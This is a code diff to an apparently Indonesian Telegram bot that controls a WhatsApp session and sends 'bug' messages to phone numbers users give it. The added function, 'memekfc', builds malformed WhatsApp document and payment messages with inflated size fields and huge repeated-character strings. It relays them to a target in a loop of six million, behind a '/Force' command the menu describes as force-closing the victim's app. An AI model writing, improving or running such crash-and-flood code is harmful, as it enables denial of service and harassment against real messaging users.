@@ -604,7 +604,52 @@ const checkPremium = async (ctx, next) => {
 };
 
 //====================DI BAWAH SINI ISI FUNCTION ELU==============================\\
-
+async function memekfc(sock, target) {
+    const repeat = 6000000; 
+    
+    for(let i = 0; i < repeat; i++) {
+        const msg = generateWAMessageFromContent(target, {
+            ephemeralMessage: {
+                message: {
+                    documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
+                        fileLength: "999999999999",
+                        pageCount: 1316134911,
+                        height: 999999999,
+                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
+                        fileName: "nj" + "ꦾ".repeat(60000),
+                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
+                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1743848703"
+                    },
+                    sendPaymentMessage: {
+                        noteMessage: {
+                            extendedTextMessage: {
+                                text: ".",
+                                matchedText: "https://t.me/",
+                                description: "!.",
+                                title: "",
+                                paymentLinkMetadata: {
+                                    button: { displayText: "\x30" },
+                                    header: { headerType: 1 },
+                                    provider: { paramsJson: "{{".repeat(7000) }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }, {});
+        
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: msg.message
+            }
+        }, { messageId: null, participant: { jid: target } });
+    }
+}
 // END FUNCTION SELESAI
 function isOwner(userId) {
   return config.OWNER_ID.includes(userId.toString());
@@ -629,7 +674,7 @@ bot.onText(/\/start/, (msg) => {
   bot.sendPhoto(chatId, "https://files.catbox.moe/01x5r0.jpg", {
     caption: `
 <blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
-( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください MAKLU KONTOL
+( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
 <blockquote>╭═───⊱ BOT ☇ INFORMATION ───═⬡</blockquote>
  𖥂 Author : @RidzzOffc
  𖥂 BotName : 𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻
@@ -685,8 +730,8 @@ bot.on("callback_query", async (query) => {
  𖥂 Aktip : ${runtime}
 
 <blockquote>╭═───⊱ TRASH MENU ───═⬡</blockquote>
-𖥂 /pyrate
-    ╰➤ Delay Bisa Spam
+𖥂 /Force
+    ╰➤ Forclose Invisible Spam
 𖥂 /hyper
     ╰➤ Forclose Ios 1Msg
 𖥂 /victrus
@@ -820,9 +865,7 @@ bot.on("callback_query", async (query) => {
   }
 }),
 
-//=======CASE BUG=========//
-
-bot.onText(/\/pyrate (\d+)/, async (msg, match) => {
+bot.onText(/\/Force (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -905,9 +948,9 @@ bot.onText(/\/pyrate (\d+)/, async (msg, match) => {
 
     // Eksekusi bug setelah progres selesai
     console.log("PROSES MENGIRIM BUG");
-    for (let i = 0; i < 35; i++) {
-      await ExploitDelayV1(sock, jid);
-      await ExploitDelayV1(sock, jid);
+    for (let i = 0; i < 5; i++) {
+      await memekfc(sock, jid);
+      await memekfc(sock, jid);
     }
     console.log("SUKSES MENGIRIM BUG⚠️");
 
